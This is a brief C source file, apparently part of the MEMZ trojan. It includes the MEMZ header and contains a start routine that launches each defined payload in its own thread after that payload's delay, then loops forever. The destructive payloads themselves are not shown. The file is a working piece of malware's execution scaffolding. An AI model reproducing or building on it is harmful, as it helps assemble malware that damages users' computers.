#include "../MEMZ.h"

void start() {
	for (int p = 0; p < nPayloads; p++) {
		Sleep(payloads[p].startDelay);
		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
	}

	for (;;) {
		Sleep(10000);
	}
}